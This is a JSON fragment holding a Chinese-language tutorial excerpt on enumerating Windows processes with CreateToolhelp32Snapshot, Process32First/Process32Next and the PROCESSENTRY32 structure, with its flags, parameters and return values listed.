    "content": " 遍历进程 1. 获取系统快照 CreateToolhelp32Snapshot 定义 HANDLE WINAPI CreateToolhelp32Snapshot( DWORD dwFlags, DWORD th32ProcessID ); 参数 dwFlags 描述 TH32CS_INHERIT 进程的创建者可以访问进程的子进程 TH32CS_SNAPALL 在快照中包含系统中的所有进程和线程 TH32CS_SNAPHEAPLIST 在快照中包含在th32ProcessID中指定的进程的所有的堆 TH32CS_SNAPMODULE 在快照中包含在th32ProcessID中指定的进程的所有的模块 TH32CS_SNAPPROCESS 在快照中包含系统中所有的进程 TH32CS_SNAPTHREAD 在快照中包含系统中所有的线程 返回值 如果成功，则返回一个进程快照的句柄；如果失败，则返回INVALID_HANDLE_VALUE 2. 遍历进程信息 在调用 CreateToolhelp32Snapshot 创建系统快照后，首先需要用 Process32First 函数获取快照中的第一个进程信息 然后用 Process32Next 函数依次获取快照中的下一个进程信息，直到没有更多的进程信息为止\nProcess32First和Process32Next 定义 BOOL WINAPI Process32First( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); BOOL WINAPI Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe ); 参数\n参数 描述 hSnapshot 进程快照的句柄 lppe 指向PROCESSENTRY32结构的指针，用于接收进程信息 返回值 如果成功，则返回TRUE；如果失败，则返回FALSE\nPROCESSENTRY32结构 PROCESSENTRY32结构用于保存有关系统中单个进程的快照信息。它定义在头文件 \u0026amp;lt;tlhelp32.h\u0026amp;gt; 中，是使用 ToolHelp32 API（如 CreateToolhelp32Snapshot、Process32First、Process32Next 等）遍历系统进程时的重要数据结构。 …",
    
    "date": "2025-04-16 13:34:43",
    "updated": "2025-04-16 13:34:43"
  }
  
]